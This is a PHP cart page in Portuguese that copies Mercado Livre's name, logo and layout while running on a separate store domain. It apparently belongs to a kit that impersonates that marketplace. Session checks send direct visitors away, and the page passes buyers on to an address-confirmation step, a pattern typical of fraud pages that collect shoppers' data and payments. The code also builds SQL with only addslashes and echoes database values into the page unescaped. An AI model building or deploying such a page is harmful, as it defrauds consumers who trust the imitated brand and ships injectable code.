<?php 
session_start();
require_once("api/db.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
    if(mysqli_num_rows($sqlx) > 0){
        if($_SESSION['session_index'] > time()){
            $sql = mysqli_query($conn, "SELECT * from config");
            while($row = mysqli_fetch_array($sql)){ 
                $cor = $row["cor"];
                $nome = $row["nome"];
            }
            $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
            while($row1 = mysqli_fetch_array($sql1)){ 
                $codigo = $row1["codigo"];
                $nomeproduto = $row1["nome"];
                $valor = $row1["valor"];
                $img = $row1["img"];
            }
            $_SESSION['session_checkout'] = time() + 1000;
        } else {
            session_destroy();
            header("Location: https://www.lojavirtual.com.br/");
            exit();
        }
    } else {
        session_destroy();
        header("Location: https://www.lojavirtual.com.br/");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Carrinho - Mercado Livre</title>
    <link rel="shortcut icon" href="./arquivos/favicon.png?v=2">
    <link rel="icon" type="image/png" href="./arquivos/favicon.png?v=2">
    <link rel="stylesheet" href="./arquivos/fa.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
        body { font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ebebeb; margin: 0; padding: 0; color: #333; }
        header { background-color: #ffe600; padding: 12px 20px; display: flex; align-items: center; justify-content: center; }
        .logo { height: 34px; }
        .container { max-width: 1000px; margin: 20px auto; display: flex; gap: 20px; padding: 0 10px; flex-wrap: wrap; }
        .cart-content { flex: 2; min-width: 300px; }
        .cart-summary { flex: 1; min-width: 300px; background: #fff; border-radius: 8px; padding: 20px; height: fit-content; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .cart-card { background: #fff; border-radius: 8px; padding: 20px; margin-bottom: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .full-badge { color: #00a650; font-weight: 700; font-style: italic; font-size: 14px; margin-bottom: 15px; display: flex; align-items: center; gap: 4px; }
        .full-badge i { font-size: 12px; }
        .product-row { display: flex; gap: 15px; align-items: flex-start; }
        .product-img { width: 64px; height: 64px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; }
        .product-info { flex: 1; }
        .product-name { font-size: 14px; font-weight: 600; margin-bottom: 5px; color: #333; text-decoration: none; }
        .product-actions { margin-top: 8px; display: flex; gap: 15px; }
        .action-link { color: #3483fa; font-size: 12px; text-decoration: none; cursor: pointer; border: none; background: none; padding: 0; }
        .quantity-selector { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 6px; overflow: hidden; height: 32px; }
        .qty-btn { background: #f5f5f5; border: none; width: 32px; height: 100%; cursor: pointer; font-size: 18px; color: #3483fa; }
        .qty-input { width: 40px; border: none; text-align: center; font-size: 14px; font-weight: 600; -moz-appearance: textfield; }
        .qty-input::-webkit-outer-spin-button, .qty-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .price-col { text-align: right; min-width: 100px; }
        .price-val { font-size: 20px; font-weight: 400; }
        .summary-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #eee; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
        .summary-total { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; font-size: 20px; font-weight: 600; }
        .btn-continue { display: block; width: 100%; background: #3483fa; color: #fff; text-align: center; padding: 15px; border-radius: 6px; font-weight: 600; text-decoration: none; margin-top: 20px; border: none; cursor: pointer; }
        .btn-continue:hover { background: #2968c8; }
        .shipping-info { color: #00a650; font-size: 13px; margin-top: 10px; display: flex; justify-content: space-between; }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .cart-summary { order: 2; }
            .cart-content { order: 1; }
        }
    </style>
</head>
<body>
    <header>
        <img src="./arquivos/logo-mercadolivre.png" alt="Mercado Livre" class="logo">
    </header>

    <div class="container">
        <div class="cart-content">
            <div class="cart-card">
                <div class="full-badge">Produtos <i class="fas fa-bolt"></i> FULL</div>
                <div class="product-row">
                    <?php 
                    // Verifica se a imagem é uma URL (começa com http) ou um arquivo local
                    $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
                    ?>
                    <img src="<?php echo $img_src; ?>" alt="<?php echo $nomeproduto; ?>" class="product-img">
                    <div class="product-info">
                        <div class="product-name"><?php echo $nomeproduto; ?></div>
                        <div class="product-actions">
                            <button class="action-link" onclick="window.location.href='index.php?id=<?php echo $codigo; ?>'">Excluir</button>
                            <a href="#" class="action-link">Mais produtos do vendedor</a>
                        </div>
                    </div>
                    <div class="quantity-controls" style="display: flex; flex-direction: column; align-items: flex-end; gap: 10px;">
                        <div class="quantity-selector">
                            <button class="qty-btn" onclick="updateQty(-1)">−</button>
                            <input type="number" id="qtyInput" class="qty-input" value="1" readonly>
                            <button class="qty-btn" onclick="updateQty(1)">+</button>
                        </div>
                        <div class="price-val" id="unitPrice">R$ <?php echo number_format($valor, 2, ',', '.'); ?></div>
                    </div>
                </div>
                <div class="shipping-info">
                    <span>Envio</span>
                    <span>Grátis</span>
                </div>
            </div>
        </div>

        <div class="cart-summary">
            <div class="summary-title">Resumo da compra</div>
            <div class="summary-row">
                <span>Produtos (<span id="summaryQty">1</span>)</span>
                <span id="subtotalPrice">R$ <?php echo number_format($valor, 2, ',', '.'); ?></span>
            </div>
            <div class="summary-row" style="color: #00a650;">
                <span>Frete</span>
                <span>Grátis</span>
            </div>
            <div class="summary-total">
                <span>Total</span>
                <span id="totalPrice">R$ <?php echo number_format($valor, 2, ',', '.'); ?></span>
            </div>

            <button class="btn-continue" onclick="proceed()">Continuar a compra</button>
        </div>
    </div>

    <script>
        let qty = 1;
        const unitPrice = <?php echo $valor; ?>;

        function updateQty(delta) {
            qty = Math.max(1, qty + delta);
            document.getElementById('qtyInput').value = qty;
            document.getElementById('summaryQty').innerText = qty;
            
            const total = qty * unitPrice;
            const formatted = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            
            document.getElementById('subtotalPrice').innerText = 'R$ ' + formatted;
            document.getElementById('totalPrice').innerText = 'R$ ' + formatted;
            
            localStorage.setItem('lojavirtual', JSON.stringify({
                precoFinal: formatted,
                quantos: qty
            }));
        }

        function proceed() {
            const formatted = (qty * unitPrice).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            localStorage.setItem('lojavirtual', JSON.stringify({
                precoFinal: formatted,
                quantos: qty
            }));
            window.location.href = 'confirm_address.php?produto=<?php echo $codigo; ?>';
        }

        // Initialize local storage
        updateQty(0);
    </script>
</body>
</html>
